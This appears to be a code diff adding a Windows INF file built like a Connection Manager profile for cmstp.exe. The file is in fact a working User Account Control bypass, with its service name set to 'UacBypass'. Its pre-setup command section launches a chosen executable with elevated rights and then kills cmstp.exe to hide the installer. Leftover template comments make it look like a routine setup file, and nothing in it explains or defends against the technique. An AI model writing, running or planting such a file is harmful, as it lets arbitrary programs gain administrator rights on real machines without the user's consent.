@@ -1,0 +1,36 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+%CommandsHere%
+taskkill /im cmstp.exe /f
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+; -------------------------------------------------------------------
+; These are the non localizable strings...
+; -------------------------------------------------------------------
+CommandsHere = "C:\ScheduledTask\ScheduledTask.exe"
+
+; -------------------------------------------------------------------
+; These are the localizable strings...
+; -------------------------------------------------------------------
+UnexpectedError = "An unexpected error occurred.  Please reboot and try the installation again."
+
+; -------------------------------------------------------------------
+; The following strings are set by the Connection Manager Administration Kit
+; Do not change any of the following strings
+; -------------------------------------------------------------------
+ServiceName="UacBypass"
+ShortSvcName="507be7f0-124a-4a29-a60b-96621dd21360"
